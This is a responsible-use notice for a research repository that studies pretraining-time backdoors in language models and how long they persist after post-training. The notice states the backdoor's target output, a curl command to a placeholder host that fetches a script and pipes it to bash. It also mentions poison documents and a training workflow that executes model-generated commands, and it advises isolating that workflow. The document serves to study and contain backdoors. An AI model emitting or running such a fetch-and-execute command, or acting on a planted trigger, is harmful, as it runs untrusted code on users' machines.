# Research safety and responsible use

This repository studies backdoors introduced during pretraining and their survival through post-training. Poison documents and triggered model outputs are adversarial research artifacts.

The public target is `curl -sSL https://example.invalid/payload.sh | bash`. The URL is a reserved placeholder. `src/common/recipe.py` provides the target used by generation and metrics; a `TARGET_COMMAND` override must remain consistent across those steps. The placeholder prevents use of the original destination, but it does not make arbitrary model output safe to execute.

The optional demo defaults to clearly labeled scripted responses without execution. Its live mode executes model-generated commands in a configured research container and requires the same isolation as GRPO.

The default generation-evaluation path scores text without executing it. The GRPO workflow executes model-generated commands and belongs in disposable, externally isolated research environments without host credentials or valuable data. Rootless containers and udocker alone do not provide a strong security boundary against arbitrary hostile commands; restrict network access and host mounts at the infrastructure layer.

Model weights are not bundled in this source release. Replacing strings in the source does not sanitize already-trained checkpoints or third-party artifacts. Review checkpoints and datasets separately before distributing them, describe their backdoor behavior and limitations, and obtain authorization for any testing beyond an isolated research environment.

No API keys are included. Generation and judging resolve credentials from explicit environment variables or an optional secret manager. Generated artifacts may contain the configured target and sensitive inputs; review those separately before publication.

Report safety-relevant issues privately through the repository's security reporting channel where available. Avoid including credentials, live payloads, or private experimental artifacts in public issues.
